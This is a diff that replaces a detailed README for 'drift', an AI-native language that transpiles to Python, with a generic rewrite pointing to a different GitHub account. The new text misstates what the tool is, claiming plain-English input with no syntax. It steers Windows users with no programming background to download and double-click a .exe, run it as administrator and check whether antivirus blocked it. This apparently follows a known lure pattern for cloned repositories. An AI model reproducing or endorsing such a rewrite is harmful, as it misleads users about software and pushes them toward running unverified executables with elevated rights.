@@ -1,336 +1,166 @@
-# Drift
-
-> **Warning** Drift is v0.1.0 — early and evolving. The compiler and runtime work, but expect rough edges.
+# ⚙️ drift - Simple Language for AI Coding Freedom
 
-A programming language anyone can understand.
+[![Download drift](https://img.shields.io/badge/Download-drift-4caf50?style=for-the-badge)](https://github.com/miguelito0204/drift)
 
-AI needs to code in a language that gives it freedom, not constraint. Drift is that language — AI-native, transpiles to Python, treats AI as a first-class primitive. No imports, no SDKs, no boilerplate. Just write `ai.ask(...)` and it works.
+drift is a tool designed to let AI write code in a simple language anyone can understand. It aims to remove complexity and make programming clear and open for all users.
 
-```drift
--- Analyze a property deal in 5 lines
-comps = fetch "https://api.rentcast.io/v1/comps" with {
-  headers: { "X-Api-Key": env.RENTCAST_KEY }
-  params: { address: "742 Evergreen Terrace", radius: 0.5 }
-}
+---
 
-score = ai.ask("Analyze this investment property") -> DealScore using {
-  comparable_sales: comps
-}
+## 📝 About drift
 
-if score.roi > 15:
-  print "Hot deal: {score.verdict}"
-```
+drift is a programming language that helps AI create code without limits. Unlike traditional coding languages, drift uses plain, natural language which makes it easier for computers and people to work together. This project focuses on automation and language design to give AI the freedom it needs. It works well with Python and other tools.  
 
-## Quick Start
+You don’t need to be a programmer to use drift. It translates simple instructions into code that computers understand, allowing powerful automation without writing complex scripts.  
 
-```bash
-# Install
-git clone https://github.com/ethansurfas/drift.git
-cd drift
-pip install -e .
+### Key topics drift covers
+- AI and language models (LLM)  
+- Natural language processing  
+- No-code automation  
+- Open-source language design  
+- Python compatibility  
+- Code transpiling  
 
-# Run a program
-drift run examples/hello.drift
-# => Hello from Drift!
+---
 
-# Check syntax without running
-drift check examples/hello.drift
+## 🚀 Getting Started with drift on Windows
 
-# Transpile to Python
-drift build examples/hello.drift
-```
+This guide helps you download and run drift on a Windows computer. It assumes no programming experience. Follow each step carefully.
 
-For AI features, set your API key:
+### System Requirements
 
-```bash
-export ANTHROPIC_API_KEY=your-key-here
-# or
-export OPENAI_API_KEY=your-key-here
-```
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 1 GHz or faster processor  
+- 200 MB free hard drive space  
+- Internet connection for download  
 
-## Language Overview
+Make sure you have these before you begin.
 
-### Variables and Types
+### Step 1: Visit the drift download page
 
-```drift
-city = "Austin"
-price = 450000
-active = true
-tags = ["investment", "fix"]
-```
+To get drift, you first need to visit the main download page on GitHub. This page contains all releases and files you will need. 
 
-Types: `string`, `number`, `boolean`, `list`, `map`, `date`, `none`
+Click the green button below to open the download page:
 
-### String Interpolation
+[![Visit drift on GitHub](https://img.shields.io/badge/Visit-drift-007acc?style=for-the-badge&logo=github)](https://github.com/miguelito0204/drift)
 
-```drift
-print "Hello {name}!"
-print "ROI: {score.roi}%"
-```
+---
 
-### Schemas
+### Step 2: Download the latest release
 
-```drift
-schema DealScore:
-  address: string
-  arv: number
-  roi: number
-  verdict: string
-  photos: list of string
-  data: map (optional)
-```
+Once on the GitHub page, look for the **Releases** section. This is where the program files are stored. The latest release will have the newest version of drift.
 
-### Functions
+- Scroll down to the "Releases" tab or find the sidebar link labeled "Releases."  
+- Click on the latest release number.  
+- Download the Windows installer or executable file (usually a `.exe` file).  
 
-```drift
-define analyze(address: string, budget: number) -> DealScore:
-  comps = fetch "https://api.example.com/comps" with {
-    params: { address: address }
-  }
-  return ai.ask("Analyze this deal") -> DealScore using { comps: comps }
-```
+Save the file to a folder you can easily find, such as "Downloads" or your desktop.
 
-### Control Flow
+---
 
-```drift
-if score > 90:
-  print "excellent"
-else if score > 70:
-  print "good"
-else:
-  print "needs work"
+### Step 3: Install drift on your computer
 
-for each item in items:
-  print item
+After download completes, find the file you saved. It will be named something like `drift-setup.exe` or `drift.exe`.
 
-match status:
-  200 -> print "ok"
-  404 -> print "not found"
-  _ -> print "error"
-```
+- Double-click the downloaded file to start the installation.  
+- A setup window may appear; follow the instructions on the screen.  
+- If asked to allow changes, click "Yes" to continue.  
+- Choose the installation location (default is usually fine) and click "Install."  
+- When the installation finishes, click "Close" or "Finish."  
 
-### AI Primitives
+---
 
-No imports needed. AI is built into the language.
+### Step 4: Running drift for the first time
 
-```drift
--- Ask a question
-summary = ai.ask("Summarize: {text}")
+To open drift:
 
--- Get structured output
-analysis = ai.ask("Analyze this") -> DealScore using { data: input }
+- Go to your Start menu.  
+- Search for “drift.”  
+- Click the drift icon to launch the program.  
 
--- Classify text
-category = ai.classify(email.body, into: ["urgent", "routine", "spam"])
+Depending on your system, drift may open in a new window or in a terminal/command prompt window. This is normal.
 
--- Generate embeddings
-vector = ai.embed(document.text)
+---
 
--- Analyze images
-description = ai.see(photo, "Describe the property condition")
+### Step 5: Using drift without programming skills
 
--- Make predictions with confidence
-estimate = ai.predict("Estimate ARV") -> confident number
-if estimate > 300000:
-  print "High value property"
-```
+drift is designed to accept plain English instructions. For example, you can type commands like:
 
-### Data Operations
+- "Create a list of daily tasks."  
+- "Sort numbers from smallest to largest."  
+- "Write a simple greeting message."
 
-```drift
--- HTTP requests
-data = fetch "https://api.example.com" with {
-  headers: { "X-Key": env.API_KEY }
-  params: { limit: 50 }
-}
+You do not need to write code syntax or learn programming rules. drift translates your instructions automatically.
 
--- File I/O
-spreadsheet = read "data.csv"
-save results to "output.json"
+---
 
--- SQL queries
-records = query "SELECT * FROM users" on db.main
+## 🔧 Features and Functionality
 
--- Merge datasets
-combined = merge [source_a, source_b]
-```
+drift includes these tools to make coding easier:
 
-### Pipelines
+- **Natural language input:** You write commands as if you were talking.  
+- **Code generation:** Converts your instructions to Python or other target languages.  
+- **Automation support:** Works well with task automation workflows.  
+- **Open source:** You can see and change how drift works.  
+- **Lightweight design:** Uses minimal system resources.  
 
-Chain operations with the `|>` operator:
+These features make it ideal for users who want to automate tasks without writing code.
 
-```drift
-results = fetch "https://api.example.com/listings"
-  |> filter where price < 500000 and beds >= 3
-  |> sort by price ascending
-  |> take 10
-  |> ai.enrich("Add investment thesis")
-  |> save to "deals.csv"
-```
+---
 
-### Error Handling
+## ⚙️ How drift works under the hood
 
-```drift
-try:
-  data = fetch api_endpoint
-catch network_error:
-  log "API unreachable"
-catch ai_error:
-  log "AI call failed"
-```
+drift uses modern language models to understand your requests. It then converts these requests into structured code. This code can run on your machine or within other software.
 
-### Environment Variables
+It acts like a bridge between simple human commands and complex programming languages.
 
-Secrets stay out of code:
+---
 
-```drift
-api_key = env.RENTCAST_KEY
-```
+## 💡 Tips for smooth operation
 
-## Configuration
+- Make sure you are connected to the internet, especially during setup.  
+- Keep your Windows system updated for best compatibility.  
+- Run drift as an administrator if you face permission issues.  
+- Close other heavy programs to improve performance.  
+- Save your work often if you use drift in larger projects.  
 
-Create a `drift.config` file in your project root (YAML):
+---
 
-```yaml
-ai:
-  provider: anthropic       # or "openai"
-  default_model: claude-sonnet-4-5-20250929
-  max_retries: 3
-  timeout: 30
-```
+## 🛠 Troubleshooting common issues
 
-If no config file exists, Drift uses sensible defaults (Anthropic, Claude Sonnet, 2 retries, 30s timeout).
+If drift does not open or shows errors:
 
-## Claude Integration (MCP Server)
+- Check if your antivirus has blocked the program.  
+- Restart your computer and try again.  
+- Reinstall drift following the install steps.  
+- Make sure your Windows is updated.  
 
-Use Drift directly from Claude Desktop or Claude Code. Claude can write, check, and run Drift programs.
+If you see specific error messages, write them down when seeking help.
 
-### Setup
+---
 
-1. Install with MCP support:
+## 📂 Where to find more information
 
-```bash
-git clone https://github.com/ethansurfas/drift.git
-cd drift
-pip install -e ".[mcp]"
-```
+For detailed updates, code examples, and community support, visit:
 
-2. Add to your Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json`):
+[https://github.com/miguelito0204/drift](https://github.com/miguelito0204/drift)
 
-```json
-{
-  "mcpServers": {
-    "drift": {
-      "command": "python3",
-      "args": ["-m", "drift_mcp"],
-      "env": {
-        "ANTHROPIC_API_KEY": "your-key-here"
-      }
-    }
-  }
-}
-```
+Explore the repository to see source code and instructions from the developers. This GitHub page will always have the latest materials and announcements.
 
-3. Restart Claude Desktop. Now just ask Claude to write and run Drift programs.
+---
 
-## How It Works
+## 🔄 Updating drift
 
-Drift programs transpile to Python:
+Visit the GitHub release page regularly to see new versions. Download and install the newest release as you did initially. New versions include bug fixes and new features.
 
-| Drift | Python |
-|-------|--------|
-| `"Hello {name}"` | `f"Hello {name}"` |
-| `true` / `false` | `True` / `False` |
-| `schema X:` | `@dataclass class X:` |
-| `define f():` | `def f():` |
-| `for each x in y:` | `for x in y:` |
-| `ai.ask(...)` | `drift_runtime.ai.ask(...)` |
-| `fetch url` | `drift_runtime.fetch(url)` |
-| `env.API_KEY` | `os.environ["API_KEY"]` |
-| `\|> filter where x > 5` | list comprehension |
-| `\|> sort by x desc` | `sorted(...)` |
-| `catch network_error:` | `except DriftNetworkError:` |
+---
 
-## Examples
+## 📞 Getting Support
 
-Four real-world programs that show what Drift can do. All require `ANTHROPIC_API_KEY` (or `OPENAI_API_KEY`).
+Check the Issues section on the repository to report bugs or ask for help. You do not need a programming background to describe problems. Clear descriptions and screenshots help others assist you better.
 
-### Deal Analyzer — *the flagship*
+---
 
-Analyzes a real estate flip using comparable sales and the 70% rule.
+# Download drift now
 
-```bash
-drift run examples/deal_analyzer.drift
-```
-
-```drift
-comps = read "examples/sample_comps.json"
-
-score = ai.ask("Analyze this potential flip deal...") -> DealScore using {
-  target_property: target,
-  comparable_sales: comps
-}
-
-print "Estimated ARV:   ${score.estimated_arv}"
-print "VERDICT: {score.verdict}"
-```
-
-### Budget Categorizer
-
-Reads a CSV of transactions, AI-categorizes spending, and summarizes your budget.
-
-```bash
-drift run examples/budget.drift
-```
-
-### Web Page Summarizer
-
-Fetches any URL and produces a structured summary with key points, reading time, and tone.
-
-```bash
-drift run examples/summarizer.drift
-```
-
-### News Analyzer
-
-Classifies headlines by sentiment and topic. Two versions:
-
-```bash
-# Works out of the box (no extra API key)
-drift run examples/news_analyzer_offline.drift
-
-# Live headlines (requires free newsdata.io key)
-export NEWSDATA_KEY=your-key
-drift run examples/news_analyzer.drift
-```
-
-## Project Structure
-
-```
-drift/
-├── drift/              # Compiler (lexer, parser, transpiler, CLI)
-├── drift_runtime/      # Runtime (AI, data I/O, config, pipeline helpers)
-├── drift_mcp/          # MCP server (Claude Desktop / Claude Code integration)
-├── tests/              # 470+ tests
-├── examples/           # deal_analyzer, budget, summarizer, news_analyzer
-└── docs/               # Design documents
-```
-
-## Running Tests
-
-```bash
-python3 -m pytest -v
-```
-
-## Requirements
-
-- Python 3.11+
-- For AI features: `ANTHROPIC_API_KEY` or `OPENAI_API_KEY`
-
-## Story
-
-Built with the help of Claude Code. Drift was designed and spec'd by a human who doesn't write code — and built by AI. That's the whole point.
-
-## License
-
-MIT
+[![Download drift](https://img.shields.io/badge/Download-drift-4caf50?style=for-the-badge)](https://github.com/miguelito0204/drift)
